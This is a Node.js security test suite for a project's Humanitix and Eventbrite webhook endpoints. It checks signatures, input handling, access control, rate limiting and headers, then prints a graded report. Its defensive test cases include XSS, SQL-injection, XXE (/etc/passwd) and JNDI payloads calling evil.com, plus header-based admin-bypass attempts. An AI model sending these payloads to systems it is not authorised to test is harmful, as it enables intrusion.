#!/usr/bin/env node

/**
 * Webhook Security Validation Suite
 * Comprehensive security testing for webhook endpoints
 */

const crypto = require('crypto');

const supabaseUrl = process.env.SUPABASE_URL || 'https://pdikjpfulhhpqpxzpgtu.supabase.co';

class WebhookSecurityValidator {
  constructor() {
    this.results = {
      signatureValidation: [],
      inputValidation: [],
      accessControl: [],
      rateLimiting: [],
      headerSecurity: []
    };
  }

  // Simple fetch polyfill for Node.js
  async fetch(url, options = {}) {
    const https = require('https');
    const http = require('http');
    const urlLib = require('url');
    
    return new Promise((resolve, reject) => {
      const parsedUrl = urlLib.parse(url);
      const isHttps = parsedUrl.protocol === 'https:';
      const lib = isHttps ? https : http;
      
      const req = lib.request({
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.path,
        method: options.method || 'GET',
        headers: options.headers || {},
        timeout: options.timeout || 10000
      }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            statusText: res.statusMessage,
            headers: res.headers,
            text: () => Promise.resolve(data),
            json: () => Promise.resolve(JSON.parse(data))
          });
        });
      });
      
      req.on('error', reject);
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });
      
      if (options.body) {
        req.write(options.body);
      }
      
      req.end();
    });
  }

  generateHumanitixSignature(payload, secret) {
    const hmac = crypto.createHmac('sha256', secret);
    hmac.update(JSON.stringify(payload));
    return hmac.digest('hex');
  }

  generateEventbriteSignature(url, secret) {
    const hmac = crypto.createHmac('sha256', secret);
    hmac.update(url + secret);
    return hmac.digest('hex');
  }

  async testSignatureValidation(platform) {
    console.log(`\n🔐 Testing signature validation for ${platform}...`);
    
    const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
    const testPayload = { test: 'signature-validation', timestamp: Date.now() };
    const testSecret = 'test-secret-key';
    
    const tests = [
      {
        name: 'Valid signature',
        signature: platform === 'humanitix' 
          ? this.generateHumanitixSignature(testPayload, testSecret)
          : this.generateEventbriteSignature(url, testSecret),
        expectSuccess: false // Will still fail due to auth, but should not be signature error
      },
      {
        name: 'Invalid signature',
        signature: 'invalid-signature-12345',
        expectSuccess: false
      },
      {
        name: 'Missing signature',
        signature: null,
        expectSuccess: false
      },
      {
        name: 'Empty signature',
        signature: '',
        expectSuccess: false
      },
      {
        name: 'Malformed signature',
        signature: '###invalid###format###',
        expectSuccess: false
      }
    ];

    for (const test of tests) {
      try {
        const headers = {
          'Content-Type': 'application/json'
        };
        
        if (test.signature !== null) {
          headers[`x-${platform}-signature`] = test.signature;
        }

        const response = await this.fetch(url, {
          method: 'POST',
          headers,
          body: JSON.stringify(testPayload),
          timeout: 5000
        });

        const result = {
          test: test.name,
          status: response.status,
          passed: response.status >= 400, // Should reject invalid requests
          expected: 'rejection',
          actual: response.status >= 400 ? 'rejected' : 'accepted'
        };

        this.results.signatureValidation.push(result);
        
        const icon = result.passed ? '✅' : '❌';
        console.log(`   ${icon} ${test.name}: ${response.status} ${response.statusText}`);

      } catch (error) {
        const result = {
          test: test.name,
          status: 'error',
          passed: true, // Errors are acceptable for security tests
          expected: 'rejection',
          actual: 'error',
          error: error.message
        };

        this.results.signatureValidation.push(result);
        console.log(`   ✅ ${test.name}: error (${error.message})`);
      }
    }
  }

  async testInputValidation(platform) {
    console.log(`\n🛡️  Testing input validation for ${platform}...`);
    
    const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
    
    const maliciousPayloads = [
      {
        name: 'XSS attempt',
        payload: { message: '<script>alert("xss")</script>' },
        dangerous: true
      },
      {
        name: 'SQL injection attempt',
        payload: { query: "'; DROP TABLE users; --" },
        dangerous: true
      },
      {
        name: 'XXE attempt',
        payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        dangerous: true,
        isXML: true
      },
      {
        name: 'LDAP injection',
        payload: { filter: '${jndi:ldap://evil.com/a}' },
        dangerous: true
      },
      {
        name: 'Template injection',
        payload: { template: '{{7*7}}' },
        dangerous: true
      },
      {
        name: 'Large payload (DoS)',
        payload: { data: 'A'.repeat(100000) },
        dangerous: true
      },
      {
        name: 'Nested object bomb',
        payload: this.createNestedObject(100),
        dangerous: true
      },
      {
        name: 'Invalid JSON',
        payload: '{"invalid": json}',
        dangerous: true,
        isRawString: true
      }
    ];

    for (const test of maliciousPayloads) {
      try {
        const headers = { 'Content-Type': 'application/json' };
        let body;
        
        if (test.isRawString) {
          body = test.payload;
        } else if (test.isXML) {
          headers['Content-Type'] = 'application/xml';
          body = test.payload;
        } else {
          body = JSON.stringify(test.payload);
        }

        const response = await this.fetch(url, {
          method: 'POST',
          headers,
          body,
          timeout: 5000
        });

        const result = {
          test: test.name,
          status: response.status,
          passed: response.status >= 400, // Should reject malicious input
          dangerous: test.dangerous,
          expected: 'rejection',
          actual: response.status >= 400 ? 'rejected' : 'accepted'
        };

        this.results.inputValidation.push(result);
        
        const icon = result.passed ? '✅' : '❌';
        console.log(`   ${icon} ${test.name}: ${response.status}`);

      } catch (error) {
        const result = {
          test: test.name,
          status: 'timeout/error',
          passed: true, // Timeouts/errors are good for malicious input
          dangerous: test.dangerous,
          expected: 'rejection',
          actual: 'timeout/error',
          error: error.message
        };

        this.results.inputValidation.push(result);
        console.log(`   ✅ ${test.name}: timeout/error (good)`);
      }
    }
  }

  createNestedObject(depth) {
    if (depth <= 0) return 'deep';
    return { nested: this.createNestedObject(depth - 1) };
  }

  async testAccessControl(platform) {
    console.log(`\n🔒 Testing access control for ${platform}...`);
    
    const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
    
    const accessTests = [
      {
        name: 'No authentication',
        headers: { 'Content-Type': 'application/json' },
        expectBlocked: true
      },
      {
        name: 'Invalid auth token',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid-token-12345'
        },
        expectBlocked: true
      },
      {
        name: 'Admin impersonation',
        headers: { 
          'Content-Type': 'application/json',
          'X-Admin': 'true',
          'X-User-Role': 'admin'
        },
        expectBlocked: true
      },
      {
        name: 'Service account bypass',
        headers: { 
          'Content-Type': 'application/json',
          'X-Service-Account': 'system',
          'X-Internal': 'true'
        },
        expectBlocked: true
      }
    ];

    for (const test of accessTests) {
      try {
        const response = await this.fetch(url, {
          method: 'POST',
          headers: test.headers,
          body: JSON.stringify({ test: 'access-control' }),
          timeout: 5000
        });

        const result = {
          test: test.name,
          status: response.status,
          passed: test.expectBlocked ? response.status >= 400 : response.ok,
          expected: test.expectBlocked ? 'blocked' : 'allowed',
          actual: response.status >= 400 ? 'blocked' : 'allowed'
        };

        this.results.accessControl.push(result);
        
        const icon = result.passed ? '✅' : '❌';
        console.log(`   ${icon} ${test.name}: ${response.status}`);

      } catch (error) {
        const result = {
          test: test.name,
          status: 'error',
          passed: test.expectBlocked, // Errors are good if we expect blocking
          expected: test.expectBlocked ? 'blocked' : 'allowed',
          actual: 'error',
          error: error.message
        };

        this.results.accessControl.push(result);
        console.log(`   ✅ ${test.name}: error (blocked)`);
      }
    }
  }

  async testRateLimiting(platform) {
    console.log(`\n⏱️  Testing rate limiting for ${platform}...`);
    
    const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
    const rapidRequests = [];
    const requestCount = 50; // Send many requests rapidly
    
    console.log(`   Sending ${requestCount} rapid requests...`);
    
    for (let i = 0; i < requestCount; i++) {
      rapidRequests.push(
        this.fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ test: `rate-limit-${i}`, timestamp: Date.now() }),
          timeout: 5000
        }).catch(error => ({ error: error.message, status: 'timeout' }))
      );
    }

    const responses = await Promise.all(rapidRequests);
    
    const rateLimited = responses.filter(r => r.status === 429).length;
    const timeouts = responses.filter(r => r.status === 'timeout').length;
    const errors = responses.filter(r => r.error && r.status !== 'timeout').length;
    const successful = responses.filter(r => r.ok).length;
    const blocked = responses.filter(r => r.status >= 400 && r.status !== 429).length;

    const result = {
      test: 'Rate limiting effectiveness',
      totalRequests: requestCount,
      rateLimited,
      timeouts,
      errors,
      successful,
      blocked,
      passed: rateLimited > 0 || timeouts > requestCount * 0.8, // Either explicit rate limiting or timeouts
      protection: rateLimited > 0 ? 'explicit' : 
                 timeouts > requestCount * 0.5 ? 'implicit' : 'none'
    };

    this.results.rateLimiting.push(result);
    
    if (result.passed) {
      console.log(`   ✅ Rate limiting detected:`);
      console.log(`      • Rate limited: ${rateLimited} requests`);
      console.log(`      • Timeouts: ${timeouts} requests`);
      console.log(`      • Protection type: ${result.protection}`);
    } else {
      console.log(`   ⚠️  No rate limiting detected:`);
      console.log(`      • All ${successful} requests succeeded`);
      console.log(`      • Consider implementing rate limiting`);
    }
  }

  async testHeaderSecurity(platform) {
    console.log(`\n🛡️  Testing security headers for ${platform}...`);
    
    const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
    
    try {
      const response = await this.fetch(url, { method: 'OPTIONS' });
      const headers = response.headers;
      
      const securityHeaders = [
        {
          name: 'X-Content-Type-Options',
          present: !!headers['x-content-type-options'],
          expected: 'nosniff',
          actual: headers['x-content-type-options'],
          critical: true
        },
        {
          name: 'X-Frame-Options',
          present: !!headers['x-frame-options'],
          expected: 'DENY or SAMEORIGIN',
          actual: headers['x-frame-options'],
          critical: true
        },
        {
          name: 'Strict-Transport-Security',
          present: !!headers['strict-transport-security'],
          expected: 'max-age=31536000',
          actual: headers['strict-transport-security'],
          critical: true
        },
        {
          name: 'X-XSS-Protection',
          present: !!headers['x-xss-protection'],
          expected: '1; mode=block',
          actual: headers['x-xss-protection'],
          critical: false
        },
        {
          name: 'Referrer-Policy',
          present: !!headers['referrer-policy'],
          expected: 'strict-origin-when-cross-origin',
          actual: headers['referrer-policy'],
          critical: false
        },
        {
          name: 'Content-Security-Policy',
          present: !!headers['content-security-policy'],
          expected: 'restrictive policy',
          actual: headers['content-security-policy'],
          critical: false
        }
      ];

      securityHeaders.forEach(header => {
        const result = {
          header: header.name,
          present: header.present,
          value: header.actual,
          critical: header.critical,
          passed: header.present,
          recommendation: header.present ? 'Good' : `Add ${header.name}: ${header.expected}`
        };

        this.results.headerSecurity.push(result);
        
        const icon = result.passed ? '✅' : (result.critical ? '❌' : '⚠️');
        console.log(`   ${icon} ${header.name}: ${result.present ? 'Present' : 'Missing'}`);
        if (result.present && result.value) {
          console.log(`      Value: ${result.value}`);
        }
      });

    } catch (error) {
      console.log(`   ❌ Could not test headers: ${error.message}`);
    }
  }

  generateSecurityReport() {
    console.log('\n' + '='.repeat(60));
    console.log('🔒 WEBHOOK SECURITY VALIDATION REPORT');
    console.log('='.repeat(60));

    // Calculate scores for each category
    const categories = Object.keys(this.results);
    const scores = {};
    
    categories.forEach(category => {
      const tests = this.results[category];
      if (tests.length > 0) {
        const passed = tests.filter(test => test.passed).length;
        scores[category] = {
          passed,
          total: tests.length,
          percentage: (passed / tests.length) * 100
        };
      }
    });

    // Overall security score
    const totalPassed = Object.values(scores).reduce((sum, score) => sum + score.passed, 0);
    const totalTests = Object.values(scores).reduce((sum, score) => sum + score.total, 0);
    const overallScore = totalTests > 0 ? (totalPassed / totalTests) * 100 : 0;

    console.log('\n🎯 SECURITY SCORES');
    console.log('-'.repeat(20));
    
    Object.entries(scores).forEach(([category, score]) => {
      const grade = score.percentage >= 90 ? 'A' : 
                   score.percentage >= 80 ? 'B' : 
                   score.percentage >= 70 ? 'C' : 
                   score.percentage >= 60 ? 'D' : 'F';
      
      const icon = score.percentage >= 80 ? '🟢' : 
                  score.percentage >= 60 ? '🟡' : '🔴';
      
      console.log(`${icon} ${category}: ${score.percentage.toFixed(1)}% (${score.passed}/${score.total}) - Grade ${grade}`);
    });

    console.log(`\n🏆 OVERALL SECURITY SCORE: ${overallScore.toFixed(1)}% (${totalPassed}/${totalTests})`);
    
    const overallGrade = overallScore >= 90 ? 'A (Excellent)' :
                        overallScore >= 80 ? 'B (Good)' :
                        overallScore >= 70 ? 'C (Fair)' :
                        overallScore >= 60 ? 'D (Poor)' : 'F (Critical Issues)';
    
    console.log(`📊 Overall Grade: ${overallGrade}`);

    // Critical Issues
    const criticalIssues = [];
    
    if (scores.signatureValidation && scores.signatureValidation.percentage < 80) {
      criticalIssues.push('Signature validation is not properly implemented');
    }
    
    if (scores.inputValidation && scores.inputValidation.percentage < 80) {
      criticalIssues.push('Input validation is insufficient');
    }
    
    if (scores.accessControl && scores.accessControl.percentage < 80) {
      criticalIssues.push('Access control mechanisms are weak');
    }

    if (criticalIssues.length > 0) {
      console.log('\n🚨 CRITICAL SECURITY ISSUES');
      console.log('-'.repeat(28));
      criticalIssues.forEach((issue, index) => {
        console.log(`${index + 1}. ${issue}`);
      });
    }

    // Security Recommendations
    console.log('\n💡 SECURITY RECOMMENDATIONS');
    console.log('-'.repeat(30));
    
    const recommendations = [
      'Implement proper webhook signature verification',
      'Add comprehensive input validation and sanitization',
      'Set up rate limiting to prevent abuse',
      'Configure security headers (HSTS, X-Frame-Options, etc.)',
      'Implement proper error handling without information disclosure',
      'Add monitoring and alerting for security events',
      'Regular security testing and penetration testing',
      'Keep dependencies updated and scan for vulnerabilities'
    ];

    recommendations.forEach((rec, index) => {
      console.log(`${index + 1}. ${rec}`);
    });

    // Save detailed report
    const reportData = {
      timestamp: new Date().toISOString(),
      overallScore: overallScore.toFixed(1),
      overallGrade,
      categoryScores: scores,
      criticalIssues,
      detailedResults: this.results,
      recommendations
    };

    try {
      const fs = require('fs');
      const reportPath = `/root/agents/webhook-security-report-${Date.now()}.json`;
      fs.writeFileSync(reportPath, JSON.stringify(reportData, null, 2));
      console.log(`\n📄 Detailed security report saved to: ${reportPath}`);
    } catch (error) {
      console.log(`⚠️  Could not save report: ${error.message}`);
    }

    return reportData;
  }

  async runSecurityValidation() {
    console.log('🔒 WEBHOOK SECURITY VALIDATION SUITE');
    console.log('='.repeat(45));
    console.log(`Start Time: ${new Date().toLocaleString()}`);

    const platforms = ['humanitix', 'eventbrite'];

    for (const platform of platforms) {
      console.log(`\n🛡️  Testing ${platform} webhook security...`);
      
      await this.testSignatureValidation(platform);
      await this.testInputValidation(platform);
      await this.testAccessControl(platform);
      await this.testRateLimiting(platform);
      await this.testHeaderSecurity(platform);
      
      console.log(`\n✅ Completed security testing for ${platform}`);
    }

    return this.generateSecurityReport();
  }
}

// Run security validation if called directly
if (require.main === module) {
  const validator = new WebhookSecurityValidator();
  validator.runSecurityValidation().catch(error => {
    console.error('❌ Security validation failed:', error);
    process.exit(1);
  });
}

module.exports = { WebhookSecurityValidator };